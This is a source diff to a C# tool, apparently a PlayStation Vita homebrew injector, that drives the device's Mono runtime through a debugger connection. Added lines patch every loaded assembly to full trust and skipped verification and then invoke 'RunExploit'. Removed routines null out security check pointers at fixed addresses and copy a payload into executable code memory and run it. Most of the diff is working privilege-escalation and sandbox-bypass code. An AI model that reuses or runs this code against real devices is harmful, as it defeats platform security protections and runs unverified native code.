@@ -143,6 +143,46 @@ namespace VitaInjector
             return (uint)val;
         }
 
+        private static void PrintHexDump(byte[] data, uint size, uint num)
+        {
+            uint i = 0, j = 0, k = 0, l = 0;
+            for (l = size / num, k = 1; l > 0; l /= num, k++)
+                ; // find number of zeros to prepend line number
+            while (j < size)
+            {
+                // line number
+                Console.Write("{0:X" + k + "}: ", j);
+                // hex value
+                for (i = 0; i < num; i++, j++)
+                {
+                    if (j < size)
+                    {
+                        Console.Write("{0:X2} ", data[j]);
+                    }
+                    else
+                    { // print blank spaces
+                        Console.Write("   ");
+                    }
+                }
+                // seperator
+                Console.Write("| ");
+                // ascii value
+                for (i = num; i > 0; i--)
+                {
+                    if (j - i < size)
+                    {
+                        Console.Write("{0}", data[j - i] < 32 || data[j - i] > 126 ? "." : Char.ToString((char)data[j - i])); // print only visible characters
+                    }
+                    else
+                    {
+                        Console.Write(" ");
+                    }
+                }
+                // new line
+                Console.WriteLine();
+            }
+        }
+
         public static void StartDump(Vita v, uint addr, uint len, FileStream dump)
         {
             if (len == 0)
@@ -224,170 +264,6 @@ namespace VitaInjector
             v.Resume();
         }
 
-        /*
-        public static void StartUVLoaderNew(Vita v)
-        {
-            Console.WriteLine("Loading UVL to memory.");
-            long loaduvl = v.GetMethod(false, "LoaderClient.ExploitMain", "LoadPayload", 0, null);
-            if (loaduvl < 0)
-            {
-                Console.WriteLine("Error getting method.");
-                return;
-            }
-            ValueImpl buffer = v.RunMethod(loaduvl, null, new ValueImpl[] { });
-
-            Console.WriteLine("Disabling security checks.");
-            ValueImpl ptr = new ValueImpl();
-            ptr.Type = ElementType.ValueType;
-            ptr.Klass = v.GetTypeObjID(true, "System.IntPtr");
-            ptr.Fields = new ValueImpl[] { new ValueImpl() };
-            ptr.Fields[0].Type = ElementType.I8;
-            ptr.Fields[0].Value = UIntToVitaInt(0x82B60424);
-            ValueImpl zero = new ValueImpl();
-            lenval.Type = ElementType.I4;
-            lenval.Value = 0;
-            long writeint32 = v.GetMethod(true, "System.Runtime.InteropServices.Marshal", "WriteInt32", 2, null);
-            if (writeint32 < 0)
-            {
-                Console.WriteLine("Error getting method.");
-                return;
-            }
-            Console.WriteLine("Nulling out first check pointer.");
-            v.RunMethod(writeint32, null, new ValueImpl[] { ptr, zero });
-            Console.WriteLine("Nulling out second check pointer.");
-            ptr.Fields[0].Value = UIntToVitaInt(0x82B75490);
-            v.RunMethod(writeint32, null, new ValueImpl[] { ptr, zero });
-
-            // tell loader to start loading
-
-            Console.WriteLine("Preparing to elevate privileges.");
-            ValueImpl exploit_class_type = new ValueImpl();
-            exploit_class_type.Type = ElementType.Object;
-            exploit_class_type.Objid = v.GetTypeObjID(false, "LoaderClient.ExploitMain");
-            ValueImpl exploit_delegate_type = new ValueImpl();
-            exploit_delegate_type.Type = ElementType.Object;
-            exploit_delegate_type.Objid = v.GetTypeObjID(true, "System.Threading.ThreadStart");
-            ValueImpl run_exploit_name = new ValueImpl();
-            run_exploit_name.Type = ElementType.Object;
-            run_exploit_name.Objid = v.CreateString("RunExploit");
-            long createdelegate = v.GetMethod(true, "System.Delegate", "CreateDelegate", 3, new string[] { "Type", "Type", "String" });
-            Console.WriteLine("Elevating privileges...");
-            ValueImpl runexploit = v.RunMethod(createdelegate, null, new ValueImpl[] { exploit_delegate_type, exploit_class_type, run_exploit_name });
-            runexploit.Type = ElementType.Object;
-
-            Console.WriteLine("Running first stage loader.");
-            long rundelegate = v.GetMethod(true, "System.Delegate", "DynamicInvokeImpl", 1, null);
-            ValueImpl nul = new ValueImpl();
-            nul.Type = (ElementType)0xf0;
-            v.RunMethod(rundelegate, runexploit, new ValueImpl[] { nul });
-
-            /*
-            Console.WriteLine("Creating new thread.");
-            long threadctor = v.GetMethod(true, "System.Threading.Thread", ".ctor", 1, new string[] { "ThreadStart" });
-            ValueImpl newthread = v.RunMethod(threadctor, null, new ValueImpl[] { runexploit });
-            newthread.Type = ElementType.Object;
-
-            Console.WriteLine("Running first stage loader.");
-            long runthreadid = v.GetMethod(true, "System.Threading.Thread", "Start", 0, null);
-            v.RunMethod(runthreadid, newthread, new ValueImpl[] { });
-            
-        }
-        */
-
-        public static long CreateArray(Vita v, string typename, ValueImpl[] items)
-        {
-            long type_tocreate = v.GetTypeObjID(true, typename);
-            long methid_createarray = v.GetMethod(true, "System.Array", "CreateInstance", 2, new string[] { "Type", "Int32" });
-            ValueImpl arg_elementtype = new ValueImpl();
-            ValueImpl arg_length = new ValueImpl();
-            arg_elementtype.Type = ElementType.Object;
-            arg_elementtype.Objid = type_tocreate;
-            arg_length.Type = ElementType.I4;
-            arg_length.Value = items.Length;
-            ValueImpl val_array = v.RunMethod(methid_createarray, null, new ValueImpl[] { arg_elementtype, arg_length });
-            val_array.Type = ElementType.Object; // fix bug
-            v.SetArray(val_array.Objid, items);
-            return val_array.Objid;
-        }
-
-        public static ValueImpl CreateDelegateFromFptr(Vita v, uint fptr, string s_type_return, string[] s_type_params, ValueImpl arg_typedel)
-        {
-            // step 1, create the dynamic method
-            long type_dynamicmethod = v.GetTypeObjID(true, "System.Reflection.Emit.DynamicMethod");
-            long type_delegate = v.GetTypeObjID(true, "System.Delegate");
-            long type_return = v.GetTypeObjID(true, s_type_return);
-            long objid_dynmethname = v.CreateString("method_" + fptr);
-            long methid_getassembly = v.GetMethod(true, "System.Reflection.Assembly", "GetAssembly", 1, new string[] { "Type"});
-            ValueImpl obj_dynmaicmethodtype = new ValueImpl();
-            obj_dynmaicmethodtype.Type = ElementType.Object;
-            obj_dynmaicmethodtype.Objid = type_dynamicmethod;
-            ValueImpl obj_callingassembly = v.RunMethod(methid_getassembly, null, new ValueImpl[] { obj_dynmaicmethodtype });
-            obj_callingassembly.Type = ElementType.Object;
-            long methid_getmodule = v.GetMethod(true, "System.Reflection.Assembly", "GetManifestModule", 0, null);
-            ValueImpl param_dynmethconstruct_module = v.RunMethod(methid_getmodule, obj_callingassembly, null);
-            param_dynmethconstruct_module.Type = ElementType.Object;
-
-            long methid_dynmethconstruct = v.GetMethod(true, "System.Reflection.Emit.DynamicMethod", ".ctor", 4, new string[] { "String", "Type", "Type[]", "Module" });
-            ValueImpl param_dynmethconstruct_name = new ValueImpl();
-            ValueImpl param_dynmethconstruct_returntype = new ValueImpl();
-            ValueImpl param_dynmethconstruct_paramtypes = new ValueImpl();
-            ValueImpl[] arr_paramtypes_values = new ValueImpl[s_type_params.Length];
-            // paramaters
-            param_dynmethconstruct_name.Type = ElementType.Object;
-            param_dynmethconstruct_name.Objid = objid_dynmethname;
-            param_dynmethconstruct_returntype.Type = ElementType.Object;
-            param_dynmethconstruct_returntype.Objid = type_return;
-            param_dynmethconstruct_paramtypes.Type = ElementType.Object;
-            for (int i = 0; i < s_type_params.Length; i++)
-            {
-                arr_paramtypes_values[i] = new ValueImpl();
-                arr_paramtypes_values[i].Type = ElementType.Object;
-                arr_paramtypes_values[i].Objid = v.GetTypeObjID(true, s_type_params[i]);
-            }
-            param_dynmethconstruct_paramtypes.Objid = CreateArray(v, "System.Type", arr_paramtypes_values);
-            ValueImpl val_dynmeth = v.RunMethod(methid_dynmethconstruct, null, new ValueImpl[] { param_dynmethconstruct_name, param_dynmethconstruct_returntype, param_dynmethconstruct_paramtypes, param_dynmethconstruct_module });
-            val_dynmeth.Type = ElementType.Object;
-
-            // step 2, get the il generator
-            long methid_getilgen = v.GetMethod(true, "System.Reflection.Emit.DynamicMethod", "GetILGenerator", 0, null);
-            ValueImpl val_gen = v.RunMethod(methid_getilgen, val_dynmeth, null);
-            val_gen.Type = ElementType.Object;
-
-            // step 3, generate bytecode to load arguments
-            long methid_emit_i32 = v.GetMethod(true, "System.Reflection.Emit.ILGenerator", "Emit", 2, new string[] { "OpCode", "Int32" });
-            long methid_emit = v.GetMethod(true, "System.Reflection.Emit.ILGenerator", "Emit", 1, new string[] { "OpCode" });
-            long methid_emit_calli = v.GetMethod(true, "System.Reflection.Emit.ILGenerator", "EmitCalli", 4, new string[] { "OpCode", "CallingConventions", "Type", "Type[]" });
-            for (int i = 0; i < s_type_params.Length; i++)
-            {
-                ValueImpl opcode = v.GetField(true, "System.Reflection.Emit.OpCodes", "Ldarg");
-                ValueImpl val_val = new ValueImpl();
-                val_val.Type = ElementType.I4;
-                val_val.Value = i;
-                v.RunMethod(methid_emit_i32, val_gen, new ValueImpl[] { opcode, val_val });
-            }
-
-            // step 4, generate bytecode run function
-            ValueImpl arg_opcode = v.GetField(true, "System.Reflection.Emit.OpCodes", "Ldc_I4");
-            ValueImpl arg_val = new ValueImpl();
-            arg_val.Type = ElementType.I4;
-            arg_val.Value = (Int32)fptr;
-            v.RunMethod(methid_emit_i32, val_gen, new ValueImpl[] { arg_opcode, arg_val });
-            arg_opcode = v.GetField(true, "System.Reflection.Emit.OpCodes", "Conv_I");
-            v.RunMethod(methid_emit, val_gen, new ValueImpl[] { arg_opcode });
-            arg_opcode = v.GetField(true, "System.Reflection.Emit.OpCodes", "Calli");
-            ValueImpl arg_callconv = new ValueImpl();
-            arg_callconv.Type = ElementType.Enum;
-            arg_callconv.Value = 3;
-            v.RunMethod(methid_emit_calli, val_gen, new ValueImpl[] { arg_opcode, arg_callconv, param_dynmethconstruct_returntype, param_dynmethconstruct_paramtypes });
-            arg_opcode = v.GetField(true, "System.Reflection.Emit.OpCodes", "Ret");
-
-            // step 5, create a delegate
-            long methid_createdel = v.GetMethod(true, "System.Reflection.Emit.DynamicMethod", "CreateDelegate", 1, new string[] { "Type" });
-            ValueImpl del = v.RunMethod(methid_createdel, val_dynmeth, new ValueImpl[] { arg_typedel });
-            del.Type = ElementType.Object;
-            return del;
-        }
-
         public static void EscalatePrivilege(Vita v)
         {
             // step 0, setup
@@ -430,6 +306,7 @@ namespace VitaInjector
             ValueImpl hashmap_len = v.RunMethod(methid_readint32, null, new ValueImpl[] { hashmap, offset });
             Console.WriteLine("Images hashmap has {0} entries", hashmap_len.Value);
             // step 3, get entries
+            Console.WriteLine("Patching all loaded images to be corlib images.");
             for (int i = 0; i < (Int32)hashmap_len.Value; i++)
             {
                 offset.Value = i * 4;
@@ -442,11 +319,25 @@ namespace VitaInjector
                     Console.WriteLine("Image data found at: 0x{0:X}", VitaIntToUInt((Int64)image_data.Fields[0].Value));
                     offset.Value = 16;
                     ValueImpl image_attributes = v.RunMethod(methid_readint32, null, new ValueImpl[] { image_data, offset });
-                    Console.WriteLine("Image attributes set to: 0x{0:X}", image_attributes.Value);
+                    Console.WriteLine("Image attributes: 0x{0:X}", image_attributes.Value);
                     // step 4, patch the attribute to include corlib
                     image_attributes.Value = (Int32)image_attributes.Value | (1 << 10);
                     v.RunMethod(methid_writeint32, null, new ValueImpl[] { image_data, offset, image_attributes });
                     Console.WriteLine("Image attributes patched to: 0x{0:X}", image_attributes.Value);
+
+                    // step 5, patch assembly to skip verification
+                    Console.WriteLine("Patching assembly in this image to be full trust and skip verification.");
+                    offset.Value = 664;
+                    ValueImpl assembly = v.RunMethod(methid_readintptr, null, new ValueImpl[] { image_data, offset });
+                    Console.WriteLine("Found assembly at: 0x{0:X}", VitaIntToUInt((Int64)assembly.Fields[0].Value));
+                    offset.Value = 88;
+                    ValueImpl assembly_attributes = v.RunMethod(methid_readint32, null, new ValueImpl[] { assembly, offset });
+                    Console.WriteLine("Assembly attributes: 0x{0:X}", assembly_attributes.Value);
+                    // set ecma, aptc, fulltrust, unmanaged, skipverification to true and initialized
+                    assembly_attributes.Value = (Int32)assembly_attributes.Value | (0xFFFF << 16);
+                    v.RunMethod(methid_writeint32, null, new ValueImpl[] { assembly, offset, assembly_attributes });
+                    Console.WriteLine("Assembly attributes patched to: 0x{0:X}", assembly_attributes.Value);
+
                     offset.Value = 8;
                     entry = v.RunMethod(methid_readintptr, null, new ValueImpl[] { entry, offset }); // next item in this slot in hashmap
                 }
@@ -462,180 +353,6 @@ namespace VitaInjector
             long methid_exploit = v.GetMethod(false, "LoaderClient.ExploitMain", "RunExploit", 0, null);
             v.RunMethod(methid_exploit, null, null);
             Console.WriteLine("Done.");
-        }
-
-        public static void StartUVLoaderOld(Vita v)
-        {
-            Console.WriteLine("Loading UVL to memory.");
-            long loaduvl = v.GetMethod(false, "LoaderClient.AppMain", "LoadUVL", 0, null);
-            if (loaduvl < 0)
-            {
-                Console.WriteLine("Error getting method.");
-                return;
-            }
-            ValueImpl buffer = v.RunMethod(loaduvl, null, new ValueImpl[] { });
-
-            Console.WriteLine("Allocating space for length of UVL.");
-            long alloc = v.GetMethod(true, "System.Runtime.InteropServices.Marshal", "AllocHGlobal", 1, new string[] { "Int32" });
-            if (alloc < 0)
-            {
-                Console.WriteLine("Error getting method.");
-                return;
-            }
-            ValueImpl lenlen = new ValueImpl();
-            lenlen.Type = ElementType.I4;
-            lenlen.Value = 4; // 4 bytes int
-            ValueImpl lenptr = v.RunMethod(alloc, null, new ValueImpl[] { lenlen });
-
-            Console.WriteLine("Getting length of UVL");
-            int length = v.GetArrayLength(buffer.Objid);
-            if (length < 0)
-            {
-                Console.WriteLine("Invalid length.");
-                return;
-            }
-            Console.WriteLine("Length is {0} bytes.", length);
-
-            Console.WriteLine("Writing length to heap.");
-            long writeint32 = v.GetMethod(true, "System.Runtime.InteropServices.Marshal", "WriteInt32", 2, null);
-            if (writeint32 < 0)
-            {
-                Console.WriteLine("Error getting method.");
-                return;
-            }
-            ValueImpl lenval = new ValueImpl();
-            lenval.Type = ElementType.I4;
-            lenval.Value = length;
-            v.RunMethod(writeint32, null, new ValueImpl[] { lenptr, lenval });
-
-            Console.WriteLine("Getting delegate to pss_code_mem_alloc().");
-            /*
-            ValueImpl fptr = new ValueImpl();
-            fptr.Type = ElementType.ValueType;
-            fptr.Klass = lenptr.Klass; // both are IntPtrs
-            fptr.Fields = new ValueImpl[] { new ValueImpl() };
-            fptr.Fields[0].Type = ElementType.I8;
-            fptr.Fields[0].Value = UIntToVitaInt(PSS_CODE_ALLOC_FUNC);
-            */
-            ValueImpl ftype = new ValueImpl();
-            ftype.Type = ElementType.Object;
-            ftype.Objid = v.GetTypeObjID(false, "LoaderClient.CodeMemAlloc");
-            ValueImpl del_code_alloc = CreateDelegateFromFptr(v, PSS_CODE_ALLOC_FUNC, "System.UInt32", new string[] { "System.UInt32" }, ftype);
-            Console.WriteLine("Getting delegate to pss_code_mem_unlock().");
-            //fptr.Fields[0].Value = UIntToVitaInt(PSS_CODE_UNLOCK);
-            ftype.Objid = v.GetTypeObjID(false, "LoaderClient.CodeMemUnlock");
-            ValueImpl del_code_unlock = CreateDelegateFromFptr(v, PSS_CODE_UNLOCK, "System.Void", new string[] {}, ftype);
-            //ValueImpl del_code_unlock = v.RunMethod(delforfptr, null, new ValueImpl[] { fptr, ftype });
-            Console.WriteLine("Getting delegate to pss_code_mem_lock().");
-            //fptr.Fields[0].Value = UIntToVitaInt(PSS_CODE_LOCK);
-            ftype.Objid = v.GetTypeObjID(false, "LoaderClient.CodeMemLock");
-            ValueImpl del_code_lock = CreateDelegateFromFptr(v, PSS_CODE_LOCK, "System.Void", new string[] { }, ftype);
-            //ValueImpl del_code_lock = v.RunMethod(delforfptr, null, new ValueImpl[] { fptr, ftype });
-
-            Console.WriteLine("Getting helper function to create code block.");
-            long alloccode = v.GetMethod(false, "LoaderClient.AppMain", "AllocCode", 3, null);
-            if (alloccode < 0)
-            {
-                Console.WriteLine("Error getting method.");
-                return;
-            }
-            // must be objects
-            del_code_alloc.Type = ElementType.Object;
-            del_code_unlock.Type = ElementType.Object;
-
-            Console.WriteLine("Getting method to copy payload to executable memory.");
-            long copy = v.GetMethod(true, "System.Runtime.InteropServices.Marshal", "Copy", 4, new string[] { "Byte[]", "Int32", "IntPtr", "Int32" });
-            if (copy < 0)
-            {
-                Console.WriteLine("Error getting method.");
-                return;
-            }
-            ValueImpl sti = new ValueImpl();
-            sti.Type = ElementType.I4;
-            sti.Value = 0;
-            buffer.Type = ElementType.Object;
-
-            Console.WriteLine("Getting method to relock code memory.");
-            long relock = v.GetMethod(false, "LoaderClient.AppMain", "RelockCode", 1, null);
-            if (relock < 0)
-            {
-                Console.WriteLine("Error getting method.");
-                return;
-            }
-            del_code_lock.Type = ElementType.Object;
-
-            Console.WriteLine("Allocating code.");
-            ValueImpl codeheap_ptr = v.RunMethod(alloccode, null, new ValueImpl[] { del_code_alloc, del_code_unlock, lenptr });
-            ValueImpl codeheap = new ValueImpl();
-            codeheap.Type = ElementType.ValueType;
-            codeheap.Klass = lenptr.Klass; // both are IntPtrs
-            codeheap.Fields = new ValueImpl[] { new ValueImpl() };
-            codeheap.Fields[0].Type = ElementType.I8;
-            codeheap.Fields[0].Value = UIntToVitaInt((uint)codeheap_ptr.Value);
-            Console.WriteLine("Copying code.");
-            v.RunMethod(copy, null, new ValueImpl[] { buffer, sti, codeheap, lenval });
-            Console.WriteLine("Locking code.");
-            v.RunMethod(relock, null, new ValueImpl[] { del_code_lock });
-
-            //Console.WriteLine ("Waiting for changes to take place...");
-            //Thread.Sleep (1000); // must do this since 1.80
-
-            Console.WriteLine("Creating a function delegate on buffer.");
-            codeheap.Fields[0].Value = (Int64)codeheap.Fields[0].Value + 1; // thumb2 code
-            ftype.Objid = v.GetTypeObjID(false, "LoaderClient.RunCode");
-            //ValueImpl del_injected = v.RunMethod(delforfptr, null, new ValueImpl[] { codeheap, ftype });
-            ValueImpl del_injected = CreateDelegateFromFptr(v, (uint)codeheap.Fields[0].Value, "System.UInt32", new string[] { }, ftype);
-
-            Console.WriteLine("Getting helper function to execute payload.");
-            long executepayload = v.GetMethod(false, "LoaderClient.AppMain", "ExecutePayload", 1, null);
-            if (executepayload < 0)
-            {
-                Console.WriteLine("Error getting method.");
-                return;
-            }
-            del_injected.Type = ElementType.Object; // must be object
-            Console.WriteLine("Running payload.");
-            v.RunMethod(executepayload, null, new ValueImpl[] { del_injected });
-        }
-
-        private static void PrintHexDump(byte[] data, uint size, uint num)
-        {
-            uint i = 0, j = 0, k = 0, l = 0;
-            for (l = size / num, k = 1; l > 0; l /= num, k++)
-                ; // find number of zeros to prepend line number
-            while (j < size)
-            {
-                // line number
-                Console.Write("{0:X" + k + "}: ", j);
-                // hex value
-                for (i = 0; i < num; i++, j++)
-                {
-                    if (j < size)
-                    {
-                        Console.Write("{0:X2} ", data[j]);
-                    }
-                    else
-                    { // print blank spaces
-                        Console.Write("   ");
-                    }
-                }
-                // seperator
-                Console.Write("| ");
-                // ascii value
-                for (i = num; i > 0; i--)
-                {
-                    if (j - i < size)
-                    {
-                        Console.Write("{0}", data[j - i] < 32 || data[j - i] > 126 ? "." : Char.ToString((char)data[j - i])); // print only visible characters
-                    }
-                    else
-                    {
-                        Console.Write(" ");
-                    }
-                }
-                // new line
-                Console.WriteLine();
-            }
         }
 
         private static string GetDumpMemoryPackage()
